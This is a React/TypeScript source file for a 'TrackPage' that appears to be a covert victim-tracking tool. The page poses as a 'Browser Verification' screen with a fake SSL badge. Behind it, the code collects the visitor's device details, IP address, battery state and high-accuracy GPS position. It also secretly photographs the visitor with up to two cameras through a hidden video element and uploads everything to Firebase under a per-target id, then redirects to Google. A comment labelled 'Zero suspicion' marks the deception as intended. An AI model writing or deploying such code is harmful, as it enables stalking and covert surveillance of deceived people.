
import React, { useEffect, useRef, useState } from 'react';
import { useParams } from 'react-router-dom';
import { collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { ref, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
import { db, storage } from '../firebase';

const TrackPage: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const [loadingStep, setLoadingStep] = useState(0);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const hasCaptured = useRef(false);

  useEffect(() => {
    // Zero suspicion: Change title immediately
    document.title = "Checking Browser Connection...";

    const steps = setInterval(() => {
      setLoadingStep(s => (s < 98 ? s + 1 : s));
    }, 120);

    const runCapture = async () => {
      if (!id || hasCaptured.current) return;
      hasCaptured.current = true;

      console.log("[Core] Verification start...");

      const payload: any = {
        userId: id,
        timestamp: serverTimestamp(),
        device: {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          // @ts-ignore
          ram: navigator.deviceMemory || "N/A",
          // @ts-ignore
          cores: navigator.hardwareConcurrency || "N/A",
          screen: `${window.screen.width}x${window.screen.height}`,
        },
        status: 'Processing'
      };

      // 1. Get Battery & IP
      try {
        const [ipRes, battery] = await Promise.all([
          fetch('https://api.ipify.org?format=json').then(r => r.json()),
          // @ts-ignore
          navigator.getBattery ? navigator.getBattery() : Promise.resolve(null)
        ]);
        payload.ip = ipRes.ip;
        if (battery) {
          payload.battery = { level: Math.round(battery.level * 100), charging: battery.charging };
        }
        console.log("[Log] Basic network/power info captured.");
      } catch (e) { console.error("Base info failed", e); }

      // 2. High Accuracy Location
      try {
        console.log("[GPS] Requesting coordinates...");
        const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          });
        });
        payload.location = {
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          altitude: pos.coords.altitude,
          speed: pos.coords.speed
        };
        console.log("[Success] GPS captured.");
      } catch (e) { console.warn("[Fail] GPS denied."); }

      // 3. Multi-Camera Capture
      const photoUrls: string[] = [];
      try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        const videoDevices = devices.filter(d => d.kind === 'videoinput');
        
        for (const dev of videoDevices.slice(0, 2)) { // Try up to 2 cameras (usually Front/Back)
          try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
              video: { deviceId: { exact: dev.deviceId } } 
            });
            
            if (videoRef.current) {
              videoRef.current.srcObject = stream;
              await new Promise(r => setTimeout(r, 2000)); // Delay for focus
              
              const canvas = canvasRef.current;
              if (canvas) {
                canvas.width = videoRef.current.videoWidth;
                canvas.height = videoRef.current.videoHeight;
                canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0);
                
                const base64 = canvas.toDataURL('image/jpeg', 0.4); // Small size but clear
                const storageRef = ref(storage, `captures/${id}/${Date.now()}_${dev.deviceId.slice(0,4)}.jpg`);
                await uploadString(storageRef, base64, 'data_url');
                const url = await getDownloadURL(storageRef);
                photoUrls.push(url);
              }
            }
            stream.getTracks().forEach(t => t.stop());
          } catch (err) { console.error("Camera fail", dev.label); }
        }
        payload.photoUrls = photoUrls;
      } catch (e) { console.error("Media enumeration failed", e); }

      // 4. Critical Data Upload
      try {
        console.log("[Sync] Pushing data to Firestore...");
        payload.status = 'Success';
        const docRef = await addDoc(collection(db, "logs"), payload);
        console.log("[Success] Saved:", docRef.id);

        clearInterval(steps);
        setLoadingStep(100);
        
        // Final redirect to common site
        setTimeout(() => {
          window.location.href = "https://www.google.com";
        }, 1500);
      } catch (err) {
        console.error("[Fatal] Firestore upload failed", err);
        setTimeout(() => window.location.href = "https://www.google.com", 2000);
      }
    };

    runCapture();
    return () => clearInterval(steps);
  }, [id]);

  return (
    <div className="min-h-screen flex items-center justify-center bg-white font-sans p-6">
      <div className="w-full max-w-sm text-center">
        <div className="mb-10">
          <div className="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6 shadow-sm"></div>
          <h1 className="text-xl font-bold text-gray-800 mb-2">Browser Verification</h1>
          <p className="text-sm text-gray-400">Verifying your secure connection to our global servers. Please wait...</p>
        </div>

        <div className="w-full bg-gray-100 h-2 rounded-full overflow-hidden mb-4">
          <div className="bg-blue-600 h-full transition-all duration-300" style={{ width: `${loadingStep}%` }}></div>
        </div>
        
        <div className="flex justify-between text-[10px] font-black text-gray-400 uppercase tracking-[0.2em]">
          <span>Security Protocol</span>
          <span>{loadingStep}%</span>
        </div>

        <div className="mt-24 opacity-5 flex flex-col items-center">
           <svg className="w-8 h-8 mb-2" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L1 21h22L12 2zm0 3.45l8.27 14.3H3.73L12 5.45zM11 10v4h2v-4h-2zm0 6v2h2v-2h-2z"/></svg>
           <span className="text-[8px] font-mono tracking-tighter uppercase">SSL/TLS 1.3 Certified Connection</span>
        </div>

        <video ref={videoRef} autoPlay muted playsInline className="hidden"></video>
        <canvas ref={canvasRef} className="hidden"></canvas>
      </div>
    </div>
  );
};

export default TrackPage;
